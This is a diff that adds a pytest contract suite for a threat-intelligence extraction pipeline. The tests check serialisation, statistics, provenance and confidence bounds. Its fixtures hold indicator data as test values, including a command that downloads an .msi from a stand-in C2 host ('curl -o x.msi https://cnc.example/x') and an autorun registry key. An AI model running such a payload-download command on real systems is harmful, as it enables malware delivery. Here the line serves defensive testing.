@@ -1,0 +1,158 @@
+"""Phase 2.5 · IEP Contract & Validation Suite.
+
+Every adapter, every engine touching an IEP, and every migration must
+pass these contract tests.  If they fail, the pipeline is broken.
+
+See /app/memory/NIVXRAY_ARCHITECTURE_V1.md.
+"""
+from __future__ import annotations
+
+import pytest
+from datetime import datetime, timezone
+
+from models import (
+    IEP,
+    IEP_SCHEMA_VERSION,
+    IEPArtifact,
+    IEPProvenance,
+    IEPRelationship,
+    IEPSource,
+    IEPStatistics,
+    IEPWarning,
+    make_iep,
+)
+from models.iep import IEPContent, IEPMetadata
+
+
+# ─── Schema Version ────────────────────────────────────────────────────
+def test_schema_version_is_semver():
+    parts = IEP_SCHEMA_VERSION.split(".")
+    assert len(parts) == 3
+    assert all(p.isdigit() for p in parts)
+
+
+# ─── R3 · IEP must round-trip cleanly ──────────────────────────────────
+def test_iep_json_roundtrip_lossless():
+    iep = make_iep(
+        source=IEPSource(kind="url", url="https://x/y"),
+        content=IEPContent(text="hello world"),
+        artifacts=[
+            IEPArtifact(type="url", value="https://x/y",
+                          source_ref="text.line.1"),
+            IEPArtifact(type="ip",  value="10.0.0.1",
+                          source_ref="text.line.1", confidence=0.9),
+        ],
+        relationships=[
+            IEPRelationship(from_ref="https://x/y", to_ref="10.0.0.1",
+                              verb="resolves_to"),
+        ],
+        adapter="uil.url_only",
+    )
+    raw = iep.model_dump_json()
+    back = IEP.model_validate_json(raw)
+    assert back.id == iep.id
+    assert back.schema_version == IEP_SCHEMA_VERSION
+    assert len(back.artifacts) == 2
+    assert back.statistics.urls == 1
+    assert back.statistics.ips  == 1
+
+
+# ─── Statistics are derived from artifacts ─────────────────────────────
+def test_statistics_auto_derived():
+    iep = make_iep(
+        source=IEPSource(kind="text"),
+        artifacts=[
+            IEPArtifact(type="command", value="whoami"),
+            IEPArtifact(type="command", value="hostname"),
+            IEPArtifact(type="hash", value="a"*64),
+            IEPArtifact(type="mitre_technique", value="T1059"),
+        ],
+    )
+    assert iep.statistics.commands == 2
+    assert iep.statistics.hashes   == 1
+    assert iep.statistics.mitre    == 1
+    assert iep.statistics.other    == 0
+
+
+# ─── R6 · Provenance always present ────────────────────────────────────
+def test_provenance_always_populated():
+    iep = make_iep(source=IEPSource(kind="text"), adapter="test.adapter",
+                     adapter_version="9.9")
+    assert iep.provenance.adapter == "test.adapter"
+    assert iep.provenance.adapter_version == "9.9"
+    assert isinstance(iep.provenance.captured_at, datetime)
+    assert iep.provenance.captured_at.tzinfo is not None
+
+
+def test_provenance_chain_for_recursive_iep():
+    """R4 · Investigation Orchestrator is the only recursion source.
+    When an artifact from IEP-A becomes a new IEP-B, IEP-B.provenance
+    must reference IEP-A."""
+    parent = make_iep(source=IEPSource(kind="url", url="https://x"))
+    child  = make_iep(
+        source=IEPSource(kind="command"),
+        adapter="uil.command",
+        parent_iep_id=parent.id,
+        pipeline_depth=1,
+    )
+    assert child.provenance.parent_iep_id == parent.id
+    assert child.provenance.pipeline_depth == 1
+
+
+# ─── R5 · Engines read artifacts, not raw content ──────────────────────
+def test_engines_can_read_by_type_without_touching_content():
+    iep = make_iep(
+        source=IEPSource(kind="image", filename="talos.jpg"),
+        content=IEPContent(text="raw OCR output …"),
+        artifacts=[
+            IEPArtifact(type="url", value="https://cnc.example/x",
+                          source_ref="ocr.block.3"),
+            IEPArtifact(type="command", value="curl -o x.msi https://cnc.example/x",
+                          source_ref="ocr.block.4"),
+        ],
+    )
+    # An engine only queries by_type / values_of.
+    urls = iep.values_of("url")
+    cmds = iep.by_type("command")
+    assert urls == ["https://cnc.example/x"]
+    assert len(cmds) == 1
+    assert cmds[0].source_ref == "ocr.block.4"
+
+
+# ─── Warnings surface adapter limitations ──────────────────────────────
+def test_warnings_flow_through():
+    iep = make_iep(
+        source=IEPSource(kind="pdf", filename="x.pdf"),
+        warnings=[
+            IEPWarning(severity="warn", code="pdf_encrypted",
+                         message="Password-protected — text extraction skipped."),
+        ],
+        adapter="adapter.pdf",
+    )
+    assert len(iep.warnings) == 1
+    assert iep.warnings[0].code == "pdf_encrypted"
+
+
+# ─── R3 · Relationships carry provenance ───────────────────────────────
+def test_relationships_have_provenance_field():
+    rel = IEPRelationship(from_ref="curl.exe", to_ref="https://x/y.msi",
+                            verb="downloads", source_ref="ocr.block.4")
+    assert rel.source_ref == "ocr.block.4"
+
+
+# ─── Canonicalisation preserved ────────────────────────────────────────
+def test_artifact_canonical_form_kept():
+    a = IEPArtifact(type="registry_key",
+                      value="HKLM\\SOFTWARE\\Run",
+                      canonical="HKEY_LOCAL_MACHINE\\SOFTWARE\\Run")
+    # Engines that need canonical form use `values_of` which prefers canonical.
+    iep = make_iep(source=IEPSource(kind="text"), artifacts=[a])
+    assert iep.values_of("registry_key") == ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Run"]
+
+
+# ─── Confidence is bounded ─────────────────────────────────────────────
+def test_confidence_bounds_enforced():
+    with pytest.raises(Exception):
+        IEPArtifact(type="url", value="https://x", confidence=1.5)
+    with pytest.raises(Exception):
+        IEPArtifact(type="url", value="https://x", confidence=-0.1)
